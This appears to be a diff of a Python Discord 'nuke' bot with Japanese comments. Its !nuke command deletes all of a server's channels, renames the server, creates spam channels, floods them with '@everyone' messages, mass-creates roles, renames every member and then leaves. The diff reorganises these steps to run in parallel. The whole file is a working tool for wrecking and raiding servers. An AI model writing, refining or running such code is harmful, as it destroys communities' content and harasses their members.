@@ -10,47 +10,42 @@ import discord
 from discord.ext import commands
 from flask import Flask, jsonify
 
-# ==================================================
 # ---------------- CONFIG ----------------
 TOKEN = os.environ.get("DISCORD_TOKEN")
 PREFIX = "!"
-
-# --- Intents ---
 INTENTS = discord.Intents.default()
 INTENTS.guilds = True
 INTENTS.messages = True
 INTENTS.message_content = True
 INTENTS.members = True  
 
-# --- Names & Counts ---
-GUILD_NEW_NAME         = "おぜう植民地"        # サーバー名
-ROLE_BASE              = "ozeumember"         # ロール名ベース
-ROLE_COUNT             = 0                    # 作成するロール数
-CHANNEL_BASE           = "ozeu-nuke"          # チャンネル名ベース
-CHANNEL_COUNT          = 50                   # 作成するチャンネル数
+# 基本設定
+ROLE_BASE = "ozeumember"       # ロール名ベース
+ROLE_COUNT = 5                 # 作成するロール数
+CHANNEL_BASE = "ozeu-nuke"     # チャンネル名ベース
+CHANNEL_COUNT = 5              # 作成するチャンネル数
+REPEAT_MESSAGE = "@everyone おぜう最強！"
+REPEAT_COUNT = 3               # 各チャンネルに送信する回数
+NEW_GUILD_NAME = "おぜう植民地"  # None にするとサーバー名変更なし
 
-# --- Messages ---
-REPEAT_MESSAGE         = "@everyone おぜうの集いに参加！ https://example.com"
-REPEAT_COUNT           = 50                    # 各チャンネルに送信する回数
+# ニックネーム変更
+CHANGE_NICKNAMES = True        # False にすると無効化
+NICK_BASE = "おぜう様万歳！"
+NICK_CHUNK_SIZE = 12
+NICK_CHUNK_SLEEP = 0.12
 
-# --- Nicknames ---
-CHANGE_NICKNAMES       = False
-NICK_BASE              = "おぜう様万歳！"     # ニックネームベース
-NICK_CHUNK_SIZE        = 12
-NICK_CHUNK_SLEEP       = 0.12
-
-# --- Parallelism / timing ---
-DELETE_CHUNK_SIZE      = 8     # チャンネル削除まとめ数
-DELETE_CHUNK_SLEEP     = 0.08
-CREATE_CHUNK_SIZE      = 6     # チャンネル作成まとめ数
-CREATE_CHUNK_SLEEP     = 0.12
-MSG_CHUNK_SIZE         = 10    # メッセージ送信まとめ数
-MSG_INTER_CHUNK_SLEEP  = 0.01
-MSG_INTER_ROUND_SLEEP  = 0.02
-POST_DELETE_WAIT       = 2.0
-ROLE_CHUNK_SIZE        = 3     # ロール作成まとめ数
-ROLE_SLEEP             = 0.05  # ロール作成の間隔
-# ==================================================
+# 並列・速度調整
+DELETE_CHUNK_SIZE = 8
+DELETE_CHUNK_SLEEP = 0.08
+CREATE_CHUNK_SIZE = 6
+CREATE_CHUNK_SLEEP = 0.12
+MSG_CHUNK_SIZE = 10
+MSG_INTER_CHUNK_SLEEP = 0.01
+MSG_INTER_ROUND_SLEEP = 0.02
+POST_DELETE_WAIT = 2.0
+ROLE_CHUNK_SIZE = 5
+ROLE_CHUNK_SLEEP = 0.05
+# ---------------------------------------
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("fast-nuke")
@@ -61,7 +56,11 @@ app = Flask(__name__)
 # --- Flask health check ---
 @app.route("/", methods=["GET"])
 def health():
-    return jsonify({"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None}), 200
+    return jsonify({
+        "status": "ok",
+        "bot_ready": bot.is_ready(),
+        "bot_user": str(bot.user) if bot.user else None
+    }), 200
 
 def start_flask():
     port = int(os.environ.get("PORT", "8080"))
@@ -75,9 +74,9 @@ def chunk_list(lst, n):
 async def safe_delete_channel(channel: discord.abc.GuildChannel):
     try:
         await channel.delete()
-        logger.info(f"Deleted: {getattr(channel, 'name', repr(channel))} ({channel.id})")
+        logger.info(f"Deleted: {channel.name} ({channel.id})")
     except Exception as e:
-        logger.warning(f"Delete failed {getattr(channel, 'name', channel)}: {e}")
+        logger.warning(f"Delete failed {channel}: {e}")
 
 async def safe_create_channel(guild: discord.Guild, name: str):
     try:
@@ -89,34 +88,16 @@ async def safe_create_channel(guild: discord.Guild, name: str):
         logger.warning(f"Create failed {name}: {e}")
         return None
 
-async def safe_send(ch: discord.TextChannel, content: str, max_retries=3):
-    if not ch or not content:
-        return
-    retries = 0
-    while True:
-        try:
-            await ch.send(content[:2000])
-            return
-        except discord.errors.Forbidden:
-            logger.warning(f"Forbidden: cannot send to {getattr(ch,'name',ch)}")
-            return
-        except discord.errors.HTTPException as e:
-            retries += 1
-            if retries > max_retries:
-                logger.warning(f"HTTPException send failed {getattr(ch,'name',ch)}: {e}")
-                return
-            await asyncio.sleep(0.5 * (2 ** (retries - 1)))
-        except Exception as e:
-            logger.exception(f"Unexpected send error {getattr(ch,'name',ch)}: {e}")
-            return
+async def safe_send(ch: discord.TextChannel, content: str):
+    try:
+        await ch.send(content[:2000])
+    except Exception as e:
+        logger.warning(f"Send failed {ch}: {e}")
 
 async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
-    if not channels or not msg:
-        return
     for _ in range(repeat):
-        for i in range(0, len(channels), MSG_CHUNK_SIZE):
-            chunk = channels[i:i+MSG_CHUNK_SIZE]
-            await asyncio.gather(*(safe_send(ch, msg) for ch in chunk))
+        for group in chunk_list(channels, MSG_CHUNK_SIZE):
+            await asyncio.gather(*(safe_send(ch, msg) for ch in group))
             await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
         await asyncio.sleep(MSG_INTER_ROUND_SLEEP)
 
@@ -125,18 +106,15 @@ async def safe_change_nick(member: discord.Member, new_nick: str):
     try:
         await member.edit(nick=new_nick)
         return True
-    except Exception as e:
-        logger.warning(f"Cannot change nick for {member}: {e}")
+    except Exception:
         return False
 
-async def change_all_nicknames(guild: discord.Guild, base: str, chunk_size: int = 12, chunk_sleep: float = 0.12):
+async def change_all_nicknames(guild: discord.Guild, base: str, chunk_size=12, chunk_sleep=0.12):
     members = [m for m in guild.members if not m.bot]
-    idx = 1
-    tasks = [(m, f"{base}-{idx+i}") for i, m in enumerate(members)]
+    tasks = [(m, f"{base}-{i+1}") for i, m in enumerate(members)]
     changed = 0
     for group in chunk_list(tasks, chunk_size):
-        coros = [safe_change_nick(m, nick) for (m, nick) in group]
-        results = await asyncio.gather(*coros)
+        results = await asyncio.gather(*(safe_change_nick(m, nick) for m, nick in group))
         changed += sum(1 for r in results if r)
         await asyncio.sleep(chunk_sleep)
     return changed
@@ -154,16 +132,6 @@ def bot_has_permissions(guild: discord.Guild):
 async def on_ready():
     logger.info(f"Logged in as {bot.user} ({bot.user.id})")
 
-# --- role creation ---
-async def create_roles(guild: discord.Guild, count: int, base: str):
-    roles = []
-    names = [f"{base}-{i}" for i in range(1, count+1)]
-    for group in chunk_list(names, ROLE_CHUNK_SIZE):
-        results = await asyncio.gather(*(guild.create_role(name=nm, permissions=discord.Permissions.none()) for nm in group))
-        roles.extend(results)
-        await asyncio.sleep(ROLE_SLEEP)
-    return roles
-
 # --- main command ---
 @bot.command(name="nuke")
 async def nuke(ctx):
@@ -174,48 +142,48 @@ async def nuke(ctx):
 
     backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
     backup_channel = await guild.create_text_channel(backup_name)
-    await backup_channel.send("⚙️ nuke 開始")
+    await backup_channel.send("⚙️ nuke 開始（backup channel created）")
 
-    # rename guild
-    if GUILD_NEW_NAME:
-        await guild.edit(name=GUILD_NEW_NAME)
-        await backup_channel.send(f"🔁 サーバー名を \"{GUILD_NEW_NAME}\" に変更しました。")
+    # --- メイン作業 ---
+    async def main_tasks():
+        # チャンネル削除
+        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
+        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
+            await asyncio.gather(*(safe_delete_channel(c) for c in group))
+            await asyncio.sleep(DELETE_CHUNK_SLEEP)
+        await asyncio.sleep(POST_DELETE_WAIT)
 
-    # change nicknames
-    if CHANGE_NICKNAMES:
-        await backup_channel.send("👥 ニックネーム変更中...")
-        changed_count = await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
-        await backup_channel.send(f"👥 ニックネーム変更完了: 成功 {changed_count}")
+        # チャンネル作成
+        names = [f"{CHANNEL_BASE}-{i}" for i in range(1, CHANNEL_COUNT+1)]
+        created_channels = []
+        for group in chunk_list(names, CREATE_CHUNK_SIZE):
+            results = await asyncio.gather(*(safe_create_channel(guild, nm) for nm in group))
+            created_channels.extend([ch for ch in results if ch])
+            await asyncio.sleep(CREATE_CHUNK_SLEEP)
 
-    # delete channels
-    channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
-    for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
-        await asyncio.gather(*(safe_delete_channel(c) for c in group))
-        await asyncio.sleep(DELETE_CHUNK_SLEEP)
-    await asyncio.sleep(POST_DELETE_WAIT)
+        # メッセージ送信
+        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
 
-    # create roles
-    roles = await create_roles(guild, ROLE_COUNT, ROLE_BASE)
-    await backup_channel.send(f"🔨 ロール作成完了 {len(roles)} 個")
+    # --- サブ作業 ---
+    async def sub_tasks():
+        if NEW_GUILD_NAME:
+            await guild.edit(name=NEW_GUILD_NAME)
+        # ロール作成
+        role_names = [f"{ROLE_BASE}-{i}" for i in range(1, ROLE_COUNT+1)]
+        for group in chunk_list(role_names, ROLE_CHUNK_SIZE):
+            await asyncio.gather(*(guild.create_role(name=nm, permissions=discord.Permissions.none()) for nm in group))
+            await asyncio.sleep(ROLE_CHUNK_SLEEP)
+        # ニックネーム変更
+        if CHANGE_NICKNAMES:
+            await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
 
-    # create channels
-    created_channels = []
-    names = [f"{CHANNEL_BASE}-{i}" for i in range(1, CHANNEL_COUNT+1)]
-    for group in chunk_list(names, CREATE_CHUNK_SIZE):
-        results = await asyncio.gather(*(safe_create_channel(guild, nm) for nm in group))
-        created_channels.extend([ch for ch in results if ch])
-        await asyncio.sleep(CREATE_CHUNK_SLEEP)
-    await backup_channel.send(f"🆕 チャンネル作成完了 {len(created_channels)} 件")
+    # --- 並列実行 ---
+    await asyncio.gather(main_tasks(), sub_tasks())
 
-    # send repeated messages
-    await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
-    await backup_channel.send("✅ nuke 全工程完了")
-
+    # --- 完了後サーバー退出 ---
+    await backup_channel.send("✅ 全作業完了。ボットはサーバーを離脱します。")
     await asyncio.sleep(1.0)
-    try:
-        await guild.leave()
-    except Exception as e:
-        logger.exception(f"Failed to leave guild: {e}")
+    await guild.leave()
 
 # Entrypoint
 if __name__ == "__main__":
